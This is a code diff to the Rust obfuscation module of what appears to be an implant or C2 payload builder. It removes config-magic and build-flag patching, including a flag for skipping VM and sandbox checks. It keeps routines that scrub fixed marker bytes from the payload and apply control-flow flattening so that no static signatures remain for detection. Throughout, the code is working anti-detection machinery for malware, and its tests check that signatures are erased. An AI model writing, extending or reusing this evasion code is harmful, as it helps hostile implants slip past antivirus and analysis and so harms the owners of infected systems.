@@ -28,8 +28,8 @@ pub enum ObfuscationError {
 const STRING_TABLE_MARKER: &[u8; 8] = b"SPECSTR\x00";
 /// Marker prefixing the API hash salt: "SPECHASH" + 4-byte salt.
 const HASH_SALT_MARKER: &[u8; 8] = b"SPECHASH";
-/// Marker for the config magic patchable region: "SPECCFGM" + 4-byte magic.
-const CONFIG_MAGIC_MARKER: &[u8; 8] = b"SPECCFGM";
+// Phase 0.4: CONFIG_MAGIC_MARKER ("SPECCFGM") removed — config magic is now
+// derived from CRC32(pic_blob[0..64]) on both builder and implant sides.
 /// Marker for the memguard nonce: "SPECMGRD" + 4 zero bytes (12 bytes total).
 const MEMGUARD_NONCE_MARKER: &[u8] = &[0x53, 0x50, 0x45, 0x43, 0x4D, 0x47, 0x52, 0x44, 0x00, 0x00, 0x00, 0x00];
 /// Marker for the heap encryption nonce: "SPECHEAP" + 4 zero bytes (12 bytes total).
@@ -132,10 +132,7 @@ pub fn obfuscate(blob: &[u8], settings: &ObfuscationSettings) -> Result<Obfuscat
         apply_control_flow_flattening(&mut out, &mut rng)?;
     }
 
-    // Phase 2: Patch config magic into the SPECCFGM region (if present).
-    // This is optional — the marker only exists if the implant was compiled
-    // with the patchable cfg_magic_marker region.
-    let _config_magic = patch_config_magic(&mut out, &mut rng).ok();
+    // Phase 0.4: SPECCFGM patching removed — config magic derived from CRC32.
 
     // Phase 3: Scrub ALL marker bytes with random data. After this point,
     // no fixed "SPEC*" strings remain in the blob.
@@ -216,15 +213,11 @@ pub fn apply_transforms(blob: &mut Vec<u8>, settings: &ObfuscationSettings) -> R
 pub fn finalize_payload(payload: &mut [u8]) {
     let mut rng = rand::thread_rng();
 
-    // Scrub all SPEC* markers (SPECSTR, SPECHASH, SPECCFGM prefix, SPECMGRD,
+    // Scrub all SPEC* markers (SPECSTR, SPECHASH, SPECMGRD,
     // SPECHEAP, SPECFLOW) and old CONFIG_MAGIC occurrences.
     scrub_markers(payload, &mut rng);
 
-    // Also scrub SPBF marker if still present (e.g. when patch_build_flags
-    // was not called or the marker was duplicated).
-    if let Some(pos) = find_marker(payload, BUILD_FLAGS_MARKER) {
-        fill_random(&mut payload[pos..pos + BUILD_FLAGS_MARKER.len()], &mut rng);
-    }
+    // Phase 0.4: SPBF marker no longer exists in the implant binary.
 
     // Scrub ALL occurrences of SPECPICBLOB marker in the final payload
     const PIC_MARKER: &[u8; 12] = b"SPECPICBLOB\x00";
@@ -497,34 +490,8 @@ fn apply_control_flow_flattening(
 // 5. Marker scrubbing — eliminate signaturable constants from final payload
 // ---------------------------------------------------------------------------
 
-/// Patch the SPECCFGM marker region with the per-build config magic value.
-///
-/// Binary layout: `[SPECCFGM] (8B) [magic: 4B zeros]`
-/// After patching: `[random 8B] [config_magic: u32 LE]`
-///
-/// Returns the config magic value written.
-pub fn patch_config_magic(blob: &mut [u8], rng: &mut impl Rng) -> Result<u32, ObfuscationError> {
-    let marker_pos = match find_marker(blob, CONFIG_MAGIC_MARKER) {
-        Some(pos) => pos,
-        None => return Err(ObfuscationError::MarkerNotFound("SPECCFGM")),
-    };
-
-    let magic_offset = marker_pos + CONFIG_MAGIC_MARKER.len();
-    ensure_range(blob, magic_offset, 4)?;
-
-    // Generate a random config magic (non-zero, avoids the old 0x53504543)
-    let config_magic: u32 = loop {
-        let v: u32 = rng.gen();
-        if v != 0 && v != 0x53504543 {
-            break v;
-        }
-    };
-
-    // Write the config magic into the 4 bytes after the marker
-    blob[magic_offset..magic_offset + 4].copy_from_slice(&config_magic.to_le_bytes());
-
-    Ok(config_magic)
-}
+// Phase 0.4: patch_config_magic() removed — config magic is now derived
+// from CRC32(pic_blob[0..64]) on both builder and implant sides.
 
 /// Replace all remaining fixed marker bytes with random data so they cannot
 /// be used as static signatures.
@@ -536,14 +503,13 @@ pub fn patch_config_magic(blob: &mut [u8], rng: &mut impl Rng) -> Result<u32, Ob
 /// Markers scrubbed:
 /// - `SPECSTR\x00` (8 bytes)
 /// - `SPECHASH` (8 bytes)
-/// - `SPECCFGM` (8 bytes) — the marker prefix only; the 4-byte magic value is preserved
 /// - `SPECMGRD....` (the 8-byte prefix of the 12-byte nonce region)
 /// - `SPECHEAP....` (the 8-byte prefix of the 12-byte nonce region)
 /// - `SPECFLOW\x00` (9 bytes)
 /// - CONFIG_MAGIC bytes `0x53504543` in the config blob header (if present)
+///
+/// Phase 0.4: `SPECCFGM` and `SPBF` markers no longer exist in the implant.
 pub fn scrub_markers(blob: &mut [u8], rng: &mut impl Rng) -> RandomizedMagics {
-    let mut config_magic = 0u32;
-
     // Scrub ALL occurrences of each marker (use while loops — stubs may
     // have duplicates in .text and .data sections).
 
@@ -557,24 +523,7 @@ pub fn scrub_markers(blob: &mut [u8], rng: &mut impl Rng) -> RandomizedMagics {
         fill_random(&mut blob[pos..pos + HASH_SALT_MARKER.len()], rng);
     }
 
-    // Scrub SPECCFGM marker prefix (8 bytes), preserving the 4-byte magic after it.
-    // Only read the magic from the FIRST occurrence (the one patched by the builder).
-    if let Some(pos) = find_marker(blob, CONFIG_MAGIC_MARKER) {
-        let magic_offset = pos + CONFIG_MAGIC_MARKER.len();
-        if magic_offset + 4 <= blob.len() {
-            config_magic = u32::from_le_bytes([
-                blob[magic_offset],
-                blob[magic_offset + 1],
-                blob[magic_offset + 2],
-                blob[magic_offset + 3],
-            ]);
-        }
-        fill_random(&mut blob[pos..pos + CONFIG_MAGIC_MARKER.len()], rng);
-    }
-    // Scrub any remaining SPECCFGM occurrences
-    while let Some(pos) = find_marker(blob, CONFIG_MAGIC_MARKER) {
-        fill_random(&mut blob[pos..pos + CONFIG_MAGIC_MARKER.len()], rng);
-    }
+    // Phase 0.4: SPECCFGM marker no longer exists in the implant binary.
 
     // Scrub SPECMGRD nonce region (12 bytes)
     while let Some(pos) = find_marker(blob, MEMGUARD_NONCE_MARKER) {
@@ -592,19 +541,15 @@ pub fn scrub_markers(blob: &mut [u8], rng: &mut impl Rng) -> RandomizedMagics {
     }
 
     // Scrub any remaining occurrences of the old CONFIG_MAGIC bytes (0x53504543 LE = "SPEC")
-    // in the blob. These appear in the config blob header embedded in the payload.
+    // in the blob. These may appear in legacy config blob headers.
     let old_magic_bytes: [u8; 4] = 0x53504543u32.to_le_bytes();
     while let Some(pos) = find_marker(blob, &old_magic_bytes) {
-        // If this is a config blob header (magic + version), patch it with
-        // the new config magic. Otherwise just randomize it.
-        if config_magic != 0 {
-            blob[pos..pos + 4].copy_from_slice(&config_magic.to_le_bytes());
-        } else {
-            fill_random(&mut blob[pos..pos + 4], rng);
-        }
+        fill_random(&mut blob[pos..pos + 4], rng);
     }
 
-    RandomizedMagics { config_magic }
+    // Phase 0.4: config_magic is derived from CRC32, not stored in RandomizedMagics.
+    // The field is kept for backward compatibility but set to 0 (unused).
+    RandomizedMagics { config_magic: 0 }
 }
 
 /// Fill a byte slice with random data.
@@ -614,59 +559,9 @@ fn fill_random(data: &mut [u8], rng: &mut impl Rng) {
     }
 }
 
-// ---------------------------------------------------------------------------
-// Build flags patching
-// ---------------------------------------------------------------------------
-
-/// Marker embedded in the implant PIC blob: "SPBF" + 1 byte flags.
-/// The builder patches the flags byte and scrubs the marker with random bytes.
-const BUILD_FLAGS_MARKER: &[u8; 4] = b"SPBF";
-
-/// Patch runtime build flags into the PIC blob via the SPBF marker.
-///
-/// The implant contains a patchable region: `['S','P','B','F', 0x00]`.
-/// This function locates the marker, writes the flags byte, and scrubs
-/// the 4-byte marker with random bytes so it doesn't appear in the final
-/// binary as a static signature.
-///
-/// Build flag bits:
-///   0x01 = debug mode (DebugView traces, simple sleep)
-///   0x02 = skip anti-analysis (VM/sandbox checks)
-pub fn patch_build_flags(blob: &mut [u8], debug_mode: bool, skip_anti_analysis: bool) {
-    let mut flags: u8 = 0;
-    if debug_mode {
-        flags |= 0x01;
-    }
-    if skip_anti_analysis {
-        flags |= 0x02;
-    }
-
-    if let Some(pos) = find_marker(blob, BUILD_FLAGS_MARKER) {
-        let flags_offset = pos + BUILD_FLAGS_MARKER.len();
-        if flags_offset < blob.len() {
-            // Patch the flags byte
-            blob[flags_offset] = flags;
-
-            // Scrub the marker with random bytes to avoid static signatures
-            let mut rng = rand::thread_rng();
-            for byte in &mut blob[pos..pos + BUILD_FLAGS_MARKER.len()] {
-                *byte = rng.gen::<u8>() | 0x01; // Avoid null bytes
-            }
-
-            tracing::debug!(
-                "Patched build flags at offset {:#x}: debug={}, skip_aa={}",
-                pos,
-                debug_mode,
-                skip_anti_analysis
-            );
-        }
-    } else {
-        tracing::warn!(
-            "Build flags marker (SPBF) not found in blob; \
-             runtime build flags will not be applied"
-        );
-    }
-}
+// Phase 0.4: patch_build_flags() and BUILD_FLAGS_MARKER ("SPBF") removed.
+// Build flags are now controlled by compile-time SPECTER_DEV_BUILD and
+// the config TLV field 0x8A (BUILD_FLAGS) parsed during cfg_init().
 
 // ---------------------------------------------------------------------------
 // Helpers
@@ -1199,7 +1094,7 @@ mod tests {
 
     #[test]
     fn test_scrub_markers_removes_all_signatures() {
-        // Build a blob containing all markers
+        // Build a blob containing all remaining markers (Phase 0.4: SPECCFGM removed)
         let mut blob = vec![0u8; 32]; // padding
         // Add SPECSTR marker
         blob.extend_from_slice(STRING_TABLE_MARKER);
@@ -1207,9 +1102,6 @@ mod tests {
         // Add SPECHASH marker
         blob.extend_from_slice(HASH_SALT_MARKER);
         blob.extend_from_slice(&[0x00; 6]); // salt(4) + count(2)
-        // Add SPECCFGM marker
-        blob.extend_from_slice(CONFIG_MAGIC_MARKER);
-        blob.extend_from_slice(&0xDEADBEEFu32.to_le_bytes()); // magic
         // Add SPECMGRD nonce
         blob.extend_from_slice(MEMGUARD_NONCE_MARKER);
         // Add SPECHEAP nonce
@@ -1226,35 +1118,15 @@ mod tests {
         // Verify no original marker bytes remain
         assert!(find_marker(&blob, STRING_TABLE_MARKER).is_none(), "SPECSTR should be scrubbed");
         assert!(find_marker(&blob, HASH_SALT_MARKER).is_none(), "SPECHASH should be scrubbed");
-        assert!(find_marker(&blob, CONFIG_MAGIC_MARKER).is_none(), "SPECCFGM should be scrubbed");
         assert!(find_marker(&blob, MEMGUARD_NONCE_MARKER).is_none(), "SPECMGRD should be scrubbed");
         assert!(find_marker(&blob, HEAP_NONCE_MARKER).is_none(), "SPECHEAP should be scrubbed");
         assert!(find_marker(&blob, CFF_MARKER).is_none(), "SPECFLOW should be scrubbed");
 
-        // Config magic should be preserved in the result
-        assert_eq!(magics.config_magic, 0xDEADBEEF);
+        // Phase 0.4: config_magic is now derived, not stored in magics
+        assert_eq!(magics.config_magic, 0);
 
         // Blob should have changed
         assert_ne!(blob, original);
-    }
-
-    #[test]
-    fn test_patch_config_magic() {
-        let mut blob = vec![0u8; 32];
-        blob.extend_from_slice(CONFIG_MAGIC_MARKER);
-        blob.extend_from_slice(&[0u8; 4]); // placeholder for magic
-        blob.extend_from_slice(&[0u8; 32]); // trailing padding
-
-        let mut rng = rand::thread_rng();
-        let magic = patch_config_magic(&mut blob, &mut rng).unwrap();
-
-        // Magic should be non-zero and not the old value
-        assert_ne!(magic, 0);
-        assert_ne!(magic, 0x53504543);
-
-        // Magic should be written at the correct offset
-        let written = u32::from_le_bytes([blob[40], blob[41], blob[42], blob[43]]);
-        assert_eq!(written, magic);
     }
 
     #[test]
